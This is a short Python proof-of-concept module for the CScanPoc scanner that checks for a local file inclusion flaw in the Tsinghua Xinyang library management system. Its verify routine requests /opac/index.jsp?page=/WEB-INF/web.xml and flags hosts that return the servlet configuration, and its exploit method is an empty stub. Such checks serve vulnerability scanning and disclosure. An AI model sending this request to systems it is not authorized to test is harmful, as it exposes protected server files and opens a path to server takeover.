# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Infosea_0004' # 平台漏洞编号，留空
    name = '北京清大新洋图书管理系统 任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-07-12'  # 漏洞公布时间
    desc = '''
        清大新洋图书系统 
        /opac/index.jsp?page=/WEB-INF/web.xml 任意文件包含漏洞，可getshell
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '北京清大新洋图书管理系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd899173e-7174-4f2f-be6d-d0bd56a4a175'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer  = http://www.wooyun.org/bugs/wooyun-2015-0125761
            hh = hackhttp.hackhttp() 
            arg = self.target       
            url = arg + "/opac/index.jsp?page=/WEB-INF/web.xml"
            code,head,res,errcode,finalurl = hh.http(url)

            if code == 200 and ("xml" in res) and ("<servlet>"  in res) and ("<servlet-mapping>" in res):
                #security_hole("任意文件包含漏洞 " + arg)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
